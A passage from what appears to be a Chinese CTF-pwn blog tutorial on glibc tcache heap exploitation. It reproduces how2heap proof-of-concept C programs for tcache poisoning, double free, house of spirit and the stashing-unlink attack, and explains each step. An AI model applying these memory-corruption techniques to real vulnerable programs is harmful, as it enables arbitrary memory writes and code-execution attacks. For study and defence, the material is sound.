class=""><p>但是<code>tache</code>里面的拿完了之后，它就会去<code>fastbin</code>里面拿，拿了之后还没完还要把<code>fastbin</code>里面的堆块放到<code>tache</code>里面去，下面是代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"><span class="keyword">void</span> *c9,*c10;</span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c9 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"><span class="built_in">free</span>(c9);</span><br><span class="line"><span class="built_in">free</span>(c10);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);<span class="comment">//tache里面已经分配完</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/4.png" class=""><p>讲完了<code>tache</code>的一些原理性的东西，接下来看看如何攻击的：</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><h3 id="libc-2-27-so"><a href="#libc-2-27-so" class="headerlink" title="libc-2.27.so"></a>libc-2.27.so</h3><h4 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h4><p>拿<code>how2heap</code>的代码来演示，目的是任意地址分配，分配到栈上的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配两个堆块之后，修改<code>b</code>的<code>fd</code>指针指向栈，如下图所示：</p><img src="/2021/10/05/tache-bin-attack/6.png" class=""><p>再分配两个堆块就获得了栈的控制权</p><img src="/2021/10/05/tache-bin-attack/5.png" class=""><p>总结一下：由于<code>tache</code>并不会检查同一链表里面的堆块大小是否相等，所以才可以把栈指针链入<code>tache</code>，然后再分配出来，这比<code>fastbin attack</code>方便多啦！，<code>fastbin attack</code>还得检查堆块大小，所以<code>fastbin attack</code>都是把<code>__malloc_hook - 0x23</code>链入再分配出来，对吧！</p><h4 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h4><p>这个攻击手法已经不太适用了，<code>tache_dup</code>很简单，就<code>free</code>两次，不赘述了，因为补丁已经给到了<code>libc-2.27.so</code>，上次打一道<code>tache</code>的题，很疑惑，为啥我的<code>tache_dup</code>就报错了呢？后面找到下面这个资料：</p><p><a href="https://blog.csdn.net/easy_level1/article/details/115724038">[总结型]记CTF PWN中过气的堆利用</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, b, c);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h4><p>这个攻击手法看起来很离谱，只是单纯的一个数组并伪造了一个<code>size</code>，然后定义了一个指针指向了此数组的<code>&amp;fake_chunks[2]</code>，在<code>free</code>就把它给放进了<code>tache</code>…，原因是由于<code>tcache_put()</code>函数检查不严格造成的，在释放的时候没有检查被释放的指针是否真的是堆块的<code>malloc</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是<code>fake_chunks</code>，可以看到伪造了个<code>size</code>：</p><img src="/2021/10/05/tache-bin-attack/7.png" class=""><p><code>free</code>之后就能看到<code>tache</code>里面有这个堆块了，再申请出来就得到了此块地址的控制器：</p><img src="/2021/10/05/tache-bin-attack/8.png" class=""><h4 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h4><p>这个攻击手法就稍微精巧一点，没有之前的这么简单粗暴，我们一步步来看！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//查看地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var addr is:%p\n&quot;</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_lis addr is:%p\n&quot;</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target addr is:%p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>stack_var[3]</code>放<code>&amp;stack_var[2]</code>的原因是为了绕过<code>unlink</code>的检查，<code>bck-&gt;fd = bin;</code>和<code>bin-&gt;bk = bck;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>申请了<code>9</code>个<code>0x90</code>大小的堆块，并把他们都放进了<code>chunk_lis</code>这个数组里面：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再<code>free</code>掉<code>6</code>个堆块，再<code>free</code>掉一个之后<code>tache</code>就满了，再往下<code>free</code>的堆块就将进到<code>unsorted bin</code>里面，<code>chunk_lis[0]</code>和<code>chunk_lis[0]</code>为什么要隔开呢？是怕它俩合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//last tcache bin</span></span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//now they are put into unsorted bin</span></span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/9.png" class=""><p>之后分配一个<code>0xa0</code>大小的堆块，它会先到<code>tache bin</code>里面寻找，发现并没有这个大小的堆块，又到<code>unsorted bin</code>里面找，还是没找到，没找到归没找到，它还是会把<code>unsorted bin</code>里面的堆块整理到对应大小的<code>bin</code>中，所以<code>chunk_lis[0]</code>和<code>chunk_lis[2]</code>会进到<code>small bin</code>，由于在<code>bin</code>中没有这个大小的堆块，所以它直接调用<code>brk</code>来创建堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/10.png" class=""><p>此时<code>malloc 0x90</code>就是直接从<code>tache</code>里面拿，为什么要这样做呢？是为了给<code>chunk_lis[0]</code>和<code>chunk_lis[2]</code>留出位置，等会就能看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><p>之后把<code>chunk3</code>也就是<code>0x603390</code>这个堆块的<code>bk</code>修改成<code>stack_var</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/11.png" class=""><p><code>calloc</code>有个特点，就是不会去<code>tache</code>里面拿堆块，不去拿就算了，还要把对应大小的堆块放进<code>tache</code>里面，这就正好了呀！这直接就把<code>stack_var</code>放进<code>tache</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/12.png" class="" 